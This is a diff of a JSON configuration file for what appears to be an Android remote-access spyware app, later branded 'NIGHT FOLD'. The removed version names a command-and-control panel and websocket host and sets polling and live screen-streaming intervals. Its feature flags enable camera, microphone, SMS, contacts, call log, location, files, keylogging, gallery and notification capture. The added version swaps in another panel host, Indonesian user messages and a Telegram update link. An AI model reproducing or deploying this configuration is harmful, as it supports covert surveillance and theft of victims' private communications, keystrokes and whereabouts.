@@ -1,33 +1,10 @@
 {
-  "version": 1,
-  "updated_at": "2026-11-14T00:00:00Z",
-
-  "panel_url": "http://bilxzzsrv.pterodactyl.my.id:4952",
-  "ws_url": "wss://bilxzzsrv.pterodactyl.my.id:4952",
-  "fallback_urls": [],
-
-  "heartbeat_interval_ms": 2000,
-  "command_interval_ms": 2000,
-  "screen_interval_ms": 200,
-  "screen_quality": 45,
-  "screen_max_fps": 10,
-  "refresh_ttl_ms": 300000,
-
-  "features": {
-    "camera": true,
-    "mic": true,
-    "screen": true,
-    "sms": true,
-    "contacts": true,
-    "call_log": true,
-    "location": true,
-    "files": true,
-    "keylog": true,
-    "gallery": true,
-    "notif": true
-  },
-
-  "lock_pin": "1234",
-  "kill_switch": false,
-  "min_app_version": 1
+  "panel_url": "http://legalprivzx.pteroq.biz.id:3777",
+  "app_name": "NIGHT FOLD",
+  "version": "2.0.0",
+  "maintenance": false,
+  "maintenance_message": "Server sedang maintenance. Coba lagi nanti.",
+  "force_update": false,
+  "update_url": "https://t.me/Info_Night_Fold",
+  "notice": "Selamat datang di Night Fold."
 }
